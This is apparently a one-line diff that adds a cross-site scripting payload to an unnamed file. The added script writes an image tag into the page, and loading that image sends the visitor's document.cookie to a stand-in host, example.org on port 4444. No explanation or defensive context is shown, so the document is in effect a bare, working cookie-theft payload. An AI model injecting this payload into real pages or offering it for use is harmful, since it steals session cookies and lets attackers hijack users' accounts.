@@ -1,0 +1,1 @@
+<script>document.getElementById('empty').innerHTML+="<img src='http://example.org:4444/"+document.cookie+"'/>";</script>
